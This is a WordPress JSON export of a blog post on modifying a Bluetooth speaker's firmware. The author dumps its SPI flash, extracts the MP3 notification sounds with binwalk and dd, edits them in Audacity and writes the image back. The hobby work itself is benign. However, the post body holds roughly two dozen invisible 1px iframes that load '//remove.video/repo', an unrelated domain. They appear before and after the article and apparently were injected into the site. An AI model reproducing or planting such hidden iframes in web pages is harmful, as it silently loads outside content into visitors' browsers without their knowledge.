{"id":1855,"date":"2021-02-27T19:32:52","date_gmt":"2021-02-27T17:32:52","guid":{"rendered":"https:\/\/olegkutkov.me\/?p=1855"},"modified":"2022-06-14T17:37:35","modified_gmt":"2022-06-14T14:37:35","slug":"hacking-a-firmware-of-bluetooth-speaker-fm-radio","status":"publish","type":"post","link":"https:\/\/olegkutkov.me\/2021\/02\/27\/hacking-a-firmware-of-bluetooth-speaker-fm-radio\/","title":{"rendered":"Hacking Bluetooth speaker\/FM radio firmware"},"content":{"rendered":"<p><img loading=\"lazy\" decoding=\"async\" class=\"alignleft size-full wp-image-1858\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/fm_radio_hack_thumb.png\" alt=\"\" width=\"150\" height=\"137\" \/><\/p>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe>I have a little Bluetooth speaker\/FM radio. This speaker is not perfect, but it is nice for its price.<\/div>\n<div>Except for a few annoying things regarding sound notifications. I decided to &#8220;fix&#8221; those issues.<br \/>\nA little bit of reverse engineering was involved.<\/div>\n<div><\/div>\n<p><!--more--><\/p>\n<p>The first problem is annoying and loud turn-on notifications. It sounds like some SMS notification. There is no way to disable or volume down this &#8220;greeting&#8221;.<\/p>\n<div style=\"width: 850px;\" class=\"wp-video\"><!--[if lt IE 9]><script>document.createElement('video');<\/script><![endif]-->\n<video class=\"wp-video-shortcode\" id=\"video-1855-1\" width=\"850\" height=\"478\" preload=\"metadata\" controls=\"controls\"><source type=\"video\/webm\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/sven_radio_turn_on.webm?_=1\" \/><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/sven_radio_turn_on.webm\">https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/sven_radio_turn_on.webm<\/a><\/video><\/div>\n<p>&nbsp;<\/p>\n<p>The second problem is also a sound notification. The speaker interrupts music with loud phone-like beeping. Its low-level battery notifications.<\/p>\n<p>Let&#8217;s open this thing.<\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/sven_radio_internal_overview.jpg\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter size-full wp-image-1875\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/sven_radio_internal_overview.jpg\" alt=\"\" width=\"700\" height=\"439\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/sven_radio_internal_overview.jpg 700w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/sven_radio_internal_overview-400x251.jpg 400w\" sizes=\"(max-width: 700px) 100vw, 700px\" \/><\/a><\/p>\n<p>A relatively simple single-board construction. I pulled the board and tried to identify all components.<\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/sven_radio_pcb_details.jpg\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter size-full wp-image-1880\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/sven_radio_pcb_details.jpg\" alt=\"\" width=\"959\" height=\"544\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/sven_radio_pcb_details.jpg 959w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/sven_radio_pcb_details-400x227.jpg 400w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/sven_radio_pcb_details-768x436.jpg 768w\" sizes=\"(max-width: 959px) 100vw, 959px\" \/><\/a><\/p>\n<p>The central processor is marked as &#8220;AE8U278&#8221;. It&#8217;s an interesting IC containing Bluetooth radio, FM tuner, ADC, MP3 decoder, and the CPU core.<br \/>\nUnfortunately, I can&#8217;t find anything about this chip.<\/p>\n<p>SC2313LD is a clone of the <a href=\"https:\/\/datasheetspdf.com\/pdf-file\/378814\/STMicroelectronics\/TDA7313\/1\">TDA7313<\/a> audio processor.<br \/>\nThis I2C-controlled chip regulates sound Volume, Tone, and signals commutation.<br \/>\nIt&#8217;s a typical solution, nothing interesting.<\/p>\n<p>It&#8217;s good to see here an SPI NOR memory chip. <a href=\"https:\/\/datasheetspdf.com\/pdf-file\/1304096\/BergMicroelectronics\/BG25Q40A\/1\">25D40<\/a> is a 4M-bit 3.3V chip. I can read and program this chip with my TL866 programmer and <a href=\"https:\/\/gitlab.com\/DavidGriffith\/minipro\/\">minipro<\/a> software.<\/p>\n<p>The SPI flash identifies as &#8220;Berg Microelectronics&#8221; BG25Q40A. But logo mismatches, probably it&#8217;s also a clone. Anyway, this chip is still can be read and programmed correctly.<\/p>\n<pre>$ minipro -p \"BG25Q40A@SOIC8\" -r sven_firmware.bin\nFound TL866CS 03.2.86 (0x256)\nReading Code... 4.89Sec OK<\/pre>\n<p>Now it&#8217;s time to explore this <code>sven_firmware.bin<\/code> flash image. The best friend of any researcher is <a href=\"https:\/\/www.refirmlabs.com\/binwalk-open-source\/\">binwalk<\/a>.<\/p>\n<pre>$ binwalk sven_firmware.bin\n\nDECIMAL HEXADECIMAL DESCRIPTION\n--------------------------------------------------------------------------------<\/pre>\n<p>And nothing. It looks like binwalk couldn&#8217;t find any valid signature. Then I thought that those sounds were stored in some simple known format.<\/p>\n<p>Let&#8217;s try to find a WAV signature:<\/p>\n<pre>WAV:\n$ binwalk sven_firmware.bin -e --dd=\".*\" --raw=\"RIFF\"\n$<\/pre>\n<p>No results. MP3?<\/p>\n<pre>$ binwalk sven_firmware.bin -e --dd=\".*\" --raw=\"ID3\"\n\nDECIMAL HEXADECIMAL DESCRIPTION\n--------------------------------------------------------------------------------\n<strong>217088<\/strong> 0x35000 Raw signature (ID3)\n254464 0x3E200 Raw signature (ID3)\n258560 0x3F200 Raw signature (ID3)\n269824 0x41E00 Raw signature (ID3)\n273920 0x42E00 Raw signature (ID3)\n278016 0x43E00 Raw signature (ID3)\n282112 0x44E00 Raw signature (ID3)\n285184 0x45A00 Raw signature (ID3)\n288768 0x46800 Raw signature (ID3)\n293376 0x47A00 Raw signature (ID3)\n296960 0x48800 Raw signature (ID3)\n300544 0x49600 Raw signature (ID3)\n304640 0x4A600 Raw signature (ID3)\n308736 0x4B600 Raw signature (ID3)\n311808 0x4C200 Raw signature (ID3)\n315392 0x4D000 Raw signature (ID3)\n317952 0x4DA00 Raw signature (ID3)\n348160 0x55000 Raw signature (ID3)\n379904 0x5CC00 Raw signature (ID3)\n384000 0x5DC00 Raw signature (ID3)<\/pre>\n<p>20 files were extracted. All files are identified as MP3.<\/p>\n<pre>$ ls _sven_firmware.bin.extracted\/\n35000 3E200 3F200 41E00 42E00 43E00 44E00 45A00 46800 47A00 48800 49600 4A600 4B600 4C200 4D000 4DA00 55000 5CC00 5DC00\n\n$ file _sven_firmware.bin.extracted\/35000 \n_sven_firmware.bin.extracted\/35000: Audio file with ID3 version 2.3.0, contains:MPEG ADTS, layer III, v2, 32 kbps, 16 kHz, Monaural\n\n$ file _sven_firmware.bin.extracted\/41E00\n_sven_firmware.bin.extracted\/41E00: Audio file with ID3 version 2.3.0, contains:MPEG ADTS, layer III, v2, 32 kbps, 16 kHz, Monaural<\/pre>\n<p>I tried to play those files. Most of them are playable MP3s but sound a little bit messy and distorted. It looks like different tracks were mixed up during extraction.<\/p>\n<p>Then I extracted all the data from the offset <strong>217088<\/strong> up to the end of the file. The file size is <strong>524288<\/strong>, so the count is <strong>307200<\/strong><\/p>\n<pre>$ dd if=sven_firmware.bin of=big.mp3 bs=1 skip=<strong>217088<\/strong> count=<strong>307200\n<\/strong><\/pre>\n<p>The resulting big.mp3 file contains multiple MP3 headers and audio samples in the correct order.<br \/>\nThe mp3 file can be opened with an <a href=\"https:\/\/www.audacityteam.org\/\">Audacity<\/a> sound editor. Now it&#8217;s very easy to listen and identify all fragments. I found that the <code>turn-on<\/code> notification is the very first chunk. Also, I found the <code>low-battery<\/code> sound.<\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/audacity_sven_big_mp3.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter size-large wp-image-1892\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/audacity_sven_big_mp3-1024x490.png\" alt=\"\" width=\"850\" height=\"407\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/audacity_sven_big_mp3-1024x490.png 1024w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/audacity_sven_big_mp3-400x191.png 400w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/audacity_sven_big_mp3-768x368.png 768w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/audacity_sven_big_mp3.png 1448w\" sizes=\"(max-width: 850px) 100vw, 850px\" \/><\/a><\/p>\n<p>Now the required sample can be extracted and replaced.<\/p>\n<p><strong>217088<\/strong> is the sample header position from the binwalk output above.<br \/>\n<strong>37376<\/strong> is the sample length (the difference between the following and current sample positions).<\/p>\n<pre>dd if=sven_firmware.bin of=1.mp3 bs=1 skip=217088 count=37376<\/pre>\n<p>It&#8217;s important to keep the original data format and total data size. 37376 bytes, 32Kbps sample rate, mono:<\/p>\n<pre>$ file 1.mp3 \n1.mp3: Audio file with ID3 version 2.3.0, contains:MPEG ADTS, layer III, v2, <strong>32 kbps<\/strong>, <strong>16 kHz<\/strong>, <strong>Monaural<\/strong><\/pre>\n<p>I decided to edit the original sound and make it less loud. In Audacity, it can be done with <code>Effect\/Amplify<\/code> Negative amplification drops the volume down.<\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/audacity_sven_volume_down.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter size-large wp-image-1896\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/audacity_sven_volume_down-1024x449.png\" alt=\"\" width=\"850\" height=\"373\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/audacity_sven_volume_down-1024x449.png 1024w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/audacity_sven_volume_down-400x175.png 400w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/audacity_sven_volume_down-768x337.png 768w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/audacity_sven_volume_down.png 1367w\" sizes=\"(max-width: 850px) 100vw, 850px\" \/><\/a><\/p>\n<p>The modified track should be exported as MP3 with corresponding parameters.<\/p>\n<p><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/audacity_sven_export_mp3.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter size-full wp-image-1897\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/audacity_sven_export_mp3.png\" alt=\"\" width=\"939\" height=\"308\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/audacity_sven_export_mp3.png 939w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/audacity_sven_export_mp3-400x131.png 400w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/audacity_sven_export_mp3-768x252.png 768w\" sizes=\"(max-width: 939px) 100vw, 939px\" \/><\/a><\/p>\n<p>The resulting file is smaller than the original by <strong>10554<\/strong> bytes. The new file is <strong>26822<\/strong>; the original was <strong>37376<\/strong>.<\/p>\n<p>Missed bytes can be filled with zeros. We need to mine <strong>10554<\/strong> zero bytes:<\/p>\n<pre>$ dd if=\/dev\/zero of=10554_bytes.bin bs=1 count=<strong>10554<\/strong>\n10554+0 records in\n10554+0 records out\n10554 bytes (11 kB, 10 KiB) copied, 0,0154512 s, 683 kB\/s<\/pre>\n<p>Now concatenate modified MP3 and zeros chunk:<\/p>\n<pre>cat 1.mp3 10554_bytes.bin &gt;1_new.mp3<\/pre>\n<p>And finally, replace the binary section with new data:<\/p>\n<pre>dd conv=notrunc if=1_new.mp3 of=sven_firmware.bin bs=1 seek=<strong>217088<\/strong><\/pre>\n<p>Write the file back to the SPI flash:<\/p>\n<pre>minipro -p \"BG25Q40A@SOIC8\" -w sven_firmware.bin<\/pre>\n<p>A quick test shows that everything is working, and the turn-on sound is less annoying now.<\/p>\n<p>In the same manner, I modified the &#8220;battery&#8221; sound. I decided to replace the original &#8220;beep&#8221; with a cat &#8220;meow&#8221; (why not?).<\/p>\n<div style=\"width: 850px;\" class=\"wp-video\"><video class=\"wp-video-shortcode\" id=\"video-1855-2\" width=\"850\" height=\"478\" preload=\"metadata\" controls=\"controls\"><source type=\"video\/webm\" src=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/sven_radio_battery_meow.webm?_=2\" \/><a href=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/sven_radio_battery_meow.webm\">https:\/\/olegkutkov.me\/wp-content\/uploads\/2021\/02\/sven_radio_battery_meow.webm<\/a><\/video><\/div>\n<p>&nbsp;<\/p>\n<p>Now I&#8217;m happy with my radio \ud83d\ude42<\/p>\n<p>Thanks for reading!<\/p>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n","protected":false},"excerpt":{"rendered":"<p>I have a little Bluetooth speaker\/FM radio. This speaker is not perfect, but it is nice for its price. Except for a few annoying things regarding sound notifications. I decided to &#8220;fix&#8221; those issues. A little bit of reverse engineering was involved.<\/p>\n","protected":false},"author":1,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":{"footnotes":""},"categories":[30,111,110,54],"tags":[113,115,114,23,112,116],"_links":{"self":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts\/1855"}],"collection":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/comments?post=1855"}],"version-history":[{"count":44,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts\/1855\/revisions"}],"predecessor-version":[{"id":2760,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts\/1855\/revisions\/2760"}],"wp:attachment":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/media?parent=1855"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/categories?post=1855"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/tags?post=1855"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}